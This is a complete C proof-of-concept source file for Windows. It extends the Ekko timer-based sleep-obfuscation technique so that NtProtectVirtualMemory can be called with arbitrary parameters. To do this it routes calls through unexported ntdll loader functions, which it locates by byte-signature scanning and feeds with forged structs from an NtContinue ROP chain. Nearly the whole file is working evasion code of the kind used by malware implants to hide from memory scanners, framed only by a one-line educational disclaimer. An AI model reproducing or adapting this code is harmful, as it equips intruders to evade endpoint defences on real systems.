/*
 * EkkoNtProtect - PoC: Arbitrary NtProtectVirtualMemory via ntdll Internal Trampolines
 *
 * Demonstrates calling NtProtectVirtualMemory with fully controlled parameters
 * (BaseAddress, RegionSize, NewProtect) from an Ekko-style timer-based ROP chain,
 * bypassing the 5th stack argument clobbering problem inherent to shared-RSP timer dispatch.
 *
 * PROBLEM:
 *   In Ekko sleep obfuscation, all timer callbacks share the same RSP. The thread pool
 *   dispatch infrastructure (TppCallbackEpilog) overwrites [RSP+0x28] between every
 *   callback, making it impossible to reliably pass a 5th stack argument to functions
 *   like NtProtectVirtualMemory. This limits Ekko to APIs with ≤4 register arguments.
 *
 * SOLUTION:
 *   Instead of calling NtProtectVirtualMemory directly, we call unexported ntdll-internal
 *   functions that internally call NtProtectVirtualMemory with a proper CALL instruction.
 *   These functions handle the 5th argument placement on their own stack frame, eliminating
 *   the shared-RSP clobbering issue entirely.
 *
 * THREE TRAMPOLINE TIERS (increasing call stack depth):
 *
 *   Tier 1: LdrpDoPostSnapWork
 *     Stack: NtProtectVirtualMemory <- LdrpDoPostSnapWork <- TimerCallback
 *     Struct: ~0xA8 bytes, 6 fields
 *
 *   Tier 2: LdrpSnapModule -> LdrpDoPostSnapWork
 *     Stack: NtProtectVirtualMemory <- LdrpDoPostSnapWork <- LdrpSnapModule <- TimerCallback
 *     Struct: ~0x220 bytes, nested inner struct + state block
 *
 *   Tier 3: LdrpProcessWork -> LdrpSnapModule -> LdrpDoPostSnapWork
 *     Stack: NtProtectVirtualMemory <- LdrpDoPostSnapWork <- LdrpSnapModule <- LdrpProcessWork <- TimerCallback
 *     Struct: ~0x220 bytes, same as Tier 2 with +0x28 status pointer
 *
 * CREDITS:
 *   - Original Ekko technique by C5pider (Austin Hudson)
 *   - Shared-RSP clobbering insight: colleague's analysis of TppCallbackEpilog behavior
 *   - Trampoline technique and ntdll enumeration: this research
 *
 * BUILD:
 *   cl.exe /O2 /W4 EkkoNtProtect.c /link ntdll.lib
 *
 * NOTE:
 *   All struct offsets, function canaries, and RVAs are specific to a particular ntdll
 *   build. The resolver functions use byte-signature scanning to locate the targets at
 *   runtime, but the signatures themselves must be validated per target OS build.
 *
 * DISCLAIMER:
 *   This code is provided for educational and authorized security research purposes only.
 */

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

/* ════════════════════════════════════════════════════════════════════════════
 * NT API typedefs
 * ════════════════════════════════════════════════════════════════════════════ */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

typedef enum _EVENT_TYPE { NotificationEvent, SynchronizationEvent } EVENT_TYPE;

typedef NTSTATUS (NTAPI *NtCreateEvent_t)(PHANDLE, ACCESS_MASK, PVOID, EVENT_TYPE, BOOLEAN);
typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *NtSetEvent_t)(HANDLE, PULONG);
typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);
typedef NTSTATUS (NTAPI *NtContinue_t)(PCONTEXT, BOOLEAN);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *RtlCreateTimerQueue_t)(PHANDLE);
typedef NTSTATUS (NTAPI *RtlCreateTimer_t)(HANDLE, PHANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef NTSTATUS (NTAPI *RtlDeleteTimerQueue_t)(HANDLE);
typedef VOID     (NTAPI *RtlCaptureContext_t)(PCONTEXT);

/* ════════════════════════════════════════════════════════════════════════════
 * Fake struct definitions for each trampoline tier
 * ════════════════════════════════════════════════════════════════════════════ */

/*
 * Tier 1: LdrpDoPostSnapWork
 *
 * LdrpDoPostSnapWork takes a single RCX argument - a pointer to a struct
 * resembling an LDR_DATA_TABLE_ENTRY. It reads BaseAddress from +0x70,
 * RegionSize from +0x78, NewProtect from +0x90, and calls NtProtectVirtualMemory
 * with NtCurrentProcess() as the handle and an on-stack OldProtect.
 *
 * Post-call path accesses +0xA0 (must be NULL to skip CFG validation)
 * and +0x38 (dereferenced at [rsi+0x6E] - must point to readable memory).
 */
typedef struct _FAKE_DOPOSTSNAP {
    BYTE    _pad0[0x38];        /* +0x00 */
    PVOID   field_38;           /* +0x38  -> self-pointer (avoids NULL deref at [rsi+0x6E]) */
    BYTE    _pad1[0x30];        /* +0x40 */
    PVOID   BaseAddress;        /* +0x70  -> target base address */
    SIZE_T  RegionSize;         /* +0x78  -> target region size */
    BYTE    _pad2[0x10];        /* +0x80 */
    ULONG   NewProtect;         /* +0x90  -> desired protection */
    BYTE    _pad3[0x04];        /* +0x94 */
    PVOID   field_98;           /* +0x98  -> NULL (CFG comparison) */
    PVOID   field_A0;           /* +0xA0  -> NULL (skip CFG export suppress) */
} FAKE_DOPOSTSNAP, *PFAKE_DOPOSTSNAP;

/*
 * Tier 2/3: LdrpSnapModule / LdrpProcessWork
 *
 * LdrpSnapModule wraps LdrpDoPostSnapWork. Setting +0x80 >= +0x68 causes
 * the import resolution loop to be skipped entirely, falling through to
 * the LdrpDoPostSnapWork call.
 *
 * LdrpProcessWork wraps LdrpSnapModule. Setting [[+0x38]+0x98]+0x38 to
 * non-zero takes the snap dispatch path. Setting RDX=1 (IsLoadOwner)
 * ensures the clean exit path (no critical sections or event signaling).
 *
 * The struct is the same for both tiers - LdrpProcessWork just adds the
 * requirement for +0x28 (status pointer) and the non-zero state value.
 */
typedef struct _FAKE_PROCESSWORK {
    /* ═══ Main struct (passed as RCX) ═══ */
    BYTE    _pad0[0x20];        /* +0x00 */
    DWORD   Flags;              /* +0x20  (not checked on snap path) */
    BYTE    _pad1[0x04];        /* +0x24 */
    PVOID   pStatusDword;       /* +0x28  -> StatusDword (for LdrpProcessWork) */
    BYTE    _pad2[0x08];        /* +0x30 */
    PVOID   pInner;             /* +0x38  -> inner struct at +0x100 */
    BYTE    _pad3[0x10];        /* +0x40 */
    PVOID   PendingReplace;     /* +0x50  -> NULL (LdrpHandlePendingModuleReplaced) */
    BYTE    _pad4[0x10];        /* +0x58 */
    DWORD   ImportCount;        /* +0x68  -> 0 (loop termination) */
    BYTE    _pad5[0x04];        /* +0x6C */
    PVOID   BaseAddress;        /* +0x70  -> target base address */
    SIZE_T  RegionSize;         /* +0x78  -> target region size */
    DWORD   CurrentIndex;       /* +0x80  -> 1 (1 >= 0 -> skip import loop) */
    BYTE    _pad6[0x0C];        /* +0x84 */
    ULONG   NewProtect;         /* +0x90  -> desired protection */
    BYTE    _pad7[0x04];        /* +0x94 */
    PVOID   field_98;           /* +0x98  -> NULL (CFG check) */
    PVOID   field_A0;           /* +0xA0  -> NULL (CFG suppress) */
    BYTE    _pad8[0x18];        /* +0xA8 */
    PVOID   ViewSection;        /* +0xC0  -> NULL (skip NtUnmapViewOfSection) */
    BYTE    _pad9[0x38];        /* +0xC8 */

    /* ═══ Inner struct at offset 0x100 ═══ */
    BYTE    inner_pad0[0x30];   /* +0x100 */
    PVOID   ImageBase;          /* +0x130 (inner+0x30) -> scratch at +0x200 */
    BYTE    inner_pad1[0x10];   /* +0x138 */
    BYTE    DllName[0x10];      /* +0x148 (inner+0x48) -> zeroed UNICODE_STRING */
    BYTE    inner_pad2[0x40];   /* +0x158 */
    PVOID   StateStructPtr;     /* +0x198 (inner+0x98) -> state block at +0x1C0 */
    BYTE    inner_pad3[0x20];   /* +0x1A0 */

    /* ═══ State block at offset 0x1C0 ═══ */
    BYTE    state_pad[0x38];    /* +0x1C0 */
    DWORD   StateValue;         /* +0x1F8 (state+0x38) -> non-zero for snap path */
    BYTE    _pad10[0x04];       /* +0x1FC */

    /* ═══ Scratch at offset 0x200 ═══ */
    BYTE    scratch[0x10];      /* +0x200 -> readable zeros */

    /* ═══ StatusDword at offset 0x210 ═══ */
    DWORD   StatusDword;        /* +0x210 -> 0 (LdrpProcessWork checks >= 0) */
    BYTE    _pad11[0x0C];       /* +0x214 */
} FAKE_PROCESSWORK, *PFAKE_PROCESSWORK;

/* ════════════════════════════════════════════════════════════════════════════
 * Signature-based resolvers for unexported ntdll functions
 *
 * Each resolver scans ntdll's .text section for a unique byte sequence
 * (canary) that identifies the target function, then walks back to the
 * function entry point.
 *
 * WARNING: Canary bytes are build-specific. Validate on each target OS.
 * ════════════════════════════════════════════════════════════════════════════ */

static BOOL FindTextSection(HMODULE hNtdll, PBYTE* ppStart, DWORD* pSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Name[0] == '.' &&
            pSec[i].Name[1] == 't' &&
            pSec[i].Name[2] == 'e' &&
            pSec[i].Name[3] == 'x' &&
            pSec[i].Name[4] == 't' &&
            pSec[i].Name[5] == 0) {
            *ppStart = (PBYTE)hNtdll + pSec[i].VirtualAddress;
            *pSize   = pSec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

static PVOID ScanForCanary(HMODULE hNtdll, const BYTE* canary, DWORD canaryLen, DWORD entryOffset) {
    PBYTE textStart = NULL;
    DWORD textSize  = 0;

    if (!FindTextSection(hNtdll, &textStart, &textSize))
        return NULL;

    for (DWORD i = 0; i <= textSize - canaryLen; i++) {
        BOOL match = TRUE;
        for (DWORD j = 0; j < canaryLen; j++) {
            if (textStart[i + j] != canary[j]) {
                match = FALSE;
                break;
            }
        }
        if (match)
            return (PVOID)(textStart + i - entryOffset);
    }
    return NULL;
}

/*
 * ResolveLdrpDoPostSnapWork
 *
 * Canary at +0x0F from function entry:
 *   48 8B 71 38             mov  rsi, [rcx+38h]
 *   48 8D 51 70             lea  rdx, [rcx+70h]
 *   33 DB                   xor  ebx, ebx
 *   48 8B F9                mov  rdi, rcx
 *   89 5C 24 50             mov  [rsp+50h], ebx
 *   48 39 1A                cmp  [rdx], rbx
 */
static PVOID ResolveLdrpDoPostSnapWork(HMODULE hNtdll) {
    static const BYTE kCanary[] = {
        0x48, 0x8B, 0x71, 0x38,
        0x48, 0x8D, 0x51, 0x70,
        0x33, 0xDB,
        0x48, 0x8B, 0xF9,
        0x89, 0x5C, 0x24, 0x50,
        0x48, 0x39, 0x1A,
    };
    return ScanForCanary(hNtdll, kCanary, sizeof(kCanary), 0x0F);
}

/*
 * ResolveLdrpSnapModule
 *
 * Canary at +0x2C from function entry:
 *   4C 8B F9                            mov  r15, rcx
 *   48 89 8C 24 D8 00 00 00             mov  [rsp+0D8h], rcx
 *   48 89 8C 24 28 01 00 00             mov  [rsp+128h], rcx
 *   45 33 F6                            xor  r14d, r14d
 *   44 89 74 24 58                      mov  [rsp+58h], r14d
 *   4C 89 74 24 48                      mov  [rsp+48h], r14
 */
static PVOID ResolveLdrpSnapModule(HMODULE hNtdll) {
    static const BYTE kCanary[] = {
        0x4C, 0x8B, 0xF9,
        0x48, 0x89, 0x8C, 0x24, 0xD8, 0x00, 0x00, 0x00,
        0x48, 0x89, 0x8C, 0x24, 0x28, 0x01, 0x00, 0x00,
        0x45, 0x33, 0xF6,
        0x44, 0x89, 0x74, 0x24, 0x58,
        0x4C, 0x89, 0x74, 0x24, 0x48,
    };
    return ScanForCanary(hNtdll, kCanary, sizeof(kCanary), 0x2C);
}

/*
 * ResolveLdrpProcessWork
 *
 * Canary at +0x05 from function entry:
 *   88 54 24 10             mov  [rsp+10h], dl
 *   48 89 4C 24 08          mov  [rsp+8], rcx
 *   56                      push rsi
 *   57                      push rdi
 *   41 56                   push r14
 *   48 83 EC 40             sub  rsp, 40h
 *   0F B6 FA                movzx edi, dl
 */
static PVOID ResolveLdrpProcessWork(HMODULE hNtdll) {
    static const BYTE kCanary[] = {
        0x88, 0x54, 0x24, 0x10,
        0x48, 0x89, 0x4C, 0x24, 0x08,
        0x56,
        0x57,
        0x41, 0x56,
        0x48, 0x83, 0xEC, 0x40,
        0x0F, 0xB6, 0xFA,
    };
    return ScanForCanary(hNtdll, kCanary, sizeof(kCanary), 0x05);
}

/* ════════════════════════════════════════════════════════════════════════════
 * Struct initialization helpers
 * ════════════════════════════════════════════════════════════════════════════ */

static void InitDoPostSnap(PFAKE_DOPOSTSNAP p, PVOID base, SIZE_T size, ULONG protect) {
    ZeroMemory(p, sizeof(*p));
    p->field_38    = (PVOID)p;      /* self-ref: [rsi+0x6E] reads zero from padding */
    p->BaseAddress = base;
    p->RegionSize  = size;
    p->NewProtect  = protect;
    /* field_98, field_A0 already NULL */
}

static void InitProcessWork(PFAKE_PROCESSWORK p, PVOID base, SIZE_T size, ULONG protect) {
    PUCHAR raw = (PUCHAR)p;
    ZeroMemory(p, sizeof(*p));

    /* LdrpProcessWork fields */
    p->pStatusDword = (PVOID)(raw + 0x210);     /* -> StatusDword (initialized to 0) */
    p->pInner       = (PVOID)(raw + 0x100);     /* -> inner struct */

    /* LdrpSnapModule fields - skip import loop */
    p->ImportCount  = 0;
    p->CurrentIndex = 1;                        /* 1 >= 0 -> skip */

    /* LdrpDoPostSnapWork fields - the actual protect call */
    p->BaseAddress  = base;
    p->RegionSize   = size;
    p->NewProtect   = protect;
    /* +0x50, +0x98, +0xA0, +0xC0 already NULL */

    /* Inner struct at +0x100 */
    *(PVOID*)(raw + 0x100 + 0x30) = (PVOID)(raw + 0x200);  /* ImageBase -> scratch */
    *(PVOID*)(raw + 0x100 + 0x98) = (PVOID)(raw + 0x1C0);  /* StateStructPtr -> state block */

    /* State block: [state+0x38] must be non-zero for snap dispatch path */
    *(DWORD*)(raw + 0x1F8) = 1;
}

/* ════════════════════════════════════════════════════════════════════════════
 * Ekko-style timer ROP chain
 *
 * Uses RtlCreateTimer with NtContinue to dispatch CONTEXT structures that
 * redirect execution to the resolved trampoline function. The trampoline
 * internally calls NtProtectVirtualMemory with proper 5th-argument placement.
 * ════════════════════════════════════════════════════════════════════════════ */

typedef enum _TRAMPOLINE_TIER {
    TIER_DOPOSTSNAP   = 1,
    TIER_SNAPMODULE   = 2,
    TIER_PROCESSWORK  = 3,
} TRAMPOLINE_TIER;

static BOOL EkkoProtect(
    PVOID   targetBase,
    SIZE_T  targetSize,
    ULONG   newProtect,
    TRAMPOLINE_TIER tier
) {
    NTSTATUS status;
    HMODULE  hNtdll = GetModuleHandleA("ntdll.dll");

    /* Resolve NT APIs */
    NtCreateEvent_t         pNtCreateEvent         = (NtCreateEvent_t)GetProcAddress(hNtdll, "NtCreateEvent");
    NtWaitForSingleObject_t pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    NtSetEvent_t            pNtSetEvent            = (NtSetEvent_t)GetProcAddress(hNtdll, "NtSetEvent");
    NtClose_t               pNtClose               = (NtClose_t)GetProcAddress(hNtdll, "NtClose");
    NtContinue_t            pNtContinue            = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
    RtlCreateTimerQueue_t   pRtlCreateTimerQueue   = (RtlCreateTimerQueue_t)GetProcAddress(hNtdll, "RtlCreateTimerQueue");
    RtlCreateTimer_t        pRtlCreateTimer        = (RtlCreateTimer_t)GetProcAddress(hNtdll, "RtlCreateTimer");
    RtlDeleteTimerQueue_t   pRtlDeleteTimerQueue   = (RtlDeleteTimerQueue_t)GetProcAddress(hNtdll, "RtlDeleteTimerQueue");
    RtlCaptureContext_t     pRtlCaptureContext     = (RtlCaptureContext_t)GetProcAddress(hNtdll, "RtlCaptureContext");

    /* Resolve trampoline target */
    PVOID pTrampoline = NULL;
    const char* tierName = NULL;

    switch (tier) {
        case TIER_DOPOSTSNAP:
            pTrampoline = ResolveLdrpDoPostSnapWork(hNtdll);
            tierName = "LdrpDoPostSnapWork";
            break;
        case TIER_SNAPMODULE:
            pTrampoline = ResolveLdrpSnapModule(hNtdll);
            tierName = "LdrpSnapModule";
            break;
        case TIER_PROCESSWORK:
            pTrampoline = ResolveLdrpProcessWork(hNtdll);
            tierName = "LdrpProcessWork";
            break;
    }

    if (!pTrampoline) {
        printf("[-] Failed to resolve %s\n", tierName);
        return FALSE;
    }
    printf("[+] Resolved %s at %p\n", tierName, pTrampoline);

    /* Allocate fake struct(s) based on tier */
    PVOID pStructMem = NULL;

    if (tier == TIER_DOPOSTSNAP) {
        PFAKE_DOPOSTSNAP pSnap = (PFAKE_DOPOSTSNAP)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FAKE_DOPOSTSNAP));
        if (!pSnap) return FALSE;
        InitDoPostSnap(pSnap, targetBase, targetSize, newProtect);
        pStructMem = pSnap;
    } else {
        /* Tier 2 and 3 use the same struct layout */
        PFAKE_PROCESSWORK pWork = (PFAKE_PROCESSWORK)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FAKE_PROCESSWORK));
        if (!pWork) return FALSE;
        InitProcessWork(pWork, targetBase, targetSize, newProtect);
        pStructMem = pWork;
    }

    /* Create timer queue and completion event */
    HANDLE hTimerQueue = NULL;
    HANDLE hTimer      = NULL;
    HANDLE hEvent      = NULL;

    status = pRtlCreateTimerQueue(&hTimerQueue);
    if (!NT_SUCCESS(status)) {
        printf("[-] RtlCreateTimerQueue failed: 0x%08lX\n", status);
        return FALSE;
    }

    status = pNtCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateEvent failed: 0x%08lX\n", status);
        return FALSE;
    }

    /* Allocate CONTEXT array on the heap for guaranteed 16-byte alignment.
     *
     * NtContinue requires DECLSPEC_ALIGN(16) CONTEXT structures because the
     * kernel performs XRSTOR/FXRSTOR from the XMM fields. Stack-allocated
     * VLAs or arrays may not satisfy this alignment, especially in PIC code
     * or when compiled with custom section attributes.
     *
     * Heap allocation (HeapAlloc) guarantees 16-byte alignment on x64.
     */
    int total = 3;  /* RtlCaptureContext + trampoline + NtSetEvent */
    PCONTEXT pRop = (PCONTEXT)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CONTEXT) * total);
    if (!pRop) return FALSE;

    CONTEXT RopInit = { 0 };
    RopInit.ContextFlags = CONTEXT_FULL;

    /* Queue RtlCaptureContext on the timer thread to capture its register state.
     * The captured context provides a valid RSP, segment registers, FP state,
     * and return address that NtContinue requires for the subsequent ROP frames. */
    status = pRtlCreateTimer(
        hTimerQueue, &hTimer,
        (WAITORTIMERCALLBACK)pRtlCaptureContext,
        &RopInit, 0, 0, WT_EXECUTEINTIMERTHREAD);

    if (!NT_SUCCESS(status)) {
        printf("[-] RtlCreateTimer (capture) failed: 0x%08lX\n", status);
        return FALSE;
    }

    /* Wait for the capture to complete */
    WaitForSingleObjectEx(hEvent, 100, FALSE);

    /* Build ROP frames from the captured context */
    int r = 0;
    for (int i = 0; i < total; i++) {
        memcpy(&pRop[i], &RopInit, sizeof(CONTEXT));
        pRop[i].Rsp -= sizeof(PVOID);
    }
    total--;

    /* Frame 0: Call the trampoline (LdrpDoPostSnapWork / LdrpSnapModule / LdrpProcessWork) */
    pRop[r].Rip = (DWORD64)pTrampoline;
    pRop[r].Rcx = (DWORD64)pStructMem;
    if (tier == TIER_PROCESSWORK) {
        pRop[r].Rdx = (DWORD64)1;  /* IsLoadOwner = TRUE -> clean exit path */
    }
    r++;

    /* Frame 1: Signal completion event */
    pRop[r].Rip = (DWORD64)pNtSetEvent;
    pRop[r].Rcx = (DWORD64)hEvent;
    pRop[r].Rdx = (DWORD64)NULL;
    r++;

    /* Queue timer-based ROP chain */
    DWORD delay = 0;
    for (int i = 0; i < total; i++) {
        status = pRtlCreateTimer(
            hTimerQueue, &hTimer,
            (WAITORTIMERCALLBACK)pNtContinue,
            &pRop[i], delay += 100, 0, WT_EXECUTEINTIMERTHREAD);
        if (!NT_SUCCESS(status)) {
            printf("[-] RtlCreateTimer (rop %d) failed: 0x%08lX\n", i, status);
            return FALSE;
        }
    }

    /* Wait for the chain to complete */
    status = pNtWaitForSingleObject(hEvent, FALSE, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Wait failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Timer chain completed successfully\n");

    /* Cleanup */
    pNtClose(hEvent);
    pRtlDeleteTimerQueue(hTimerQueue);
    HeapFree(GetProcessHeap(), 0, pRop);
    HeapFree(GetProcessHeap(), 0, pStructMem);

    return TRUE;
}

/* ════════════════════════════════════════════════════════════════════════════
 * Verification helper
 * ════════════════════════════════════════════════════════════════════════════ */

static void QueryProtection(PVOID addr, const char* label) {
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(addr, &mbi, sizeof(mbi));
    printf("  [%s] Base: %p  Size: 0x%llX  Protect: 0x%lX\n",
        label, mbi.BaseAddress, (unsigned long long)mbi.RegionSize, mbi.Protect);
}

/* ════════════════════════════════════════════════════════════════════════════
 * Main - demonstrate arbitrary NtProtectVirtualMemory via each tier
 * ════════════════════════════════════════════════════════════════════════════ */

int main(void) {
    printf("=== EkkoNtProtect PoC ===\n\n");

    /* Allocate a test region to protect/unprotect */
    SIZE_T regionSize = 0x10000;
    PVOID testRegion = VirtualAlloc(NULL, regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!testRegion) {
        printf("[-] VirtualAlloc failed\n");
        return 1;
    }
    printf("[*] Test region: %p (size: 0x%llX)\n\n", testRegion, (unsigned long long)regionSize);

    /* Try each tier */
    TRAMPOLINE_TIER tiers[] = { TIER_DOPOSTSNAP, TIER_SNAPMODULE, TIER_PROCESSWORK };
    const char* tierNames[] = { "Tier 1 (LdrpDoPostSnapWork)", "Tier 2 (LdrpSnapModule)", "Tier 3 (LdrpProcessWork)" };

    for (int t = 0; t < 3; t++) {
        printf("--- %s ---\n", tierNames[t]);

        /* Reset to RWX */
        DWORD old;
        VirtualProtect(testRegion, regionSize, PAGE_EXECUTE_READWRITE, &old);

        QueryProtection(testRegion, "BEFORE");

        /* RWX -> RW via trampoline */
        printf("[*] Changing to PAGE_READWRITE via timer chain...\n");
        if (EkkoProtect(testRegion, regionSize, PAGE_READWRITE, tiers[t])) {
            QueryProtection(testRegion, "AFTER ");

            /* RW -> RX via trampoline */
            printf("[*] Changing to PAGE_EXECUTE_READ via timer chain...\n");
            if (EkkoProtect(testRegion, regionSize, PAGE_EXECUTE_READ, tiers[t])) {
                QueryProtection(testRegion, "FINAL ");
            }
        }
        printf("\n");
    }

    VirtualFree(testRegion, 0, MEM_RELEASE);
    printf("[*] Done.\n");
    return 0;
}
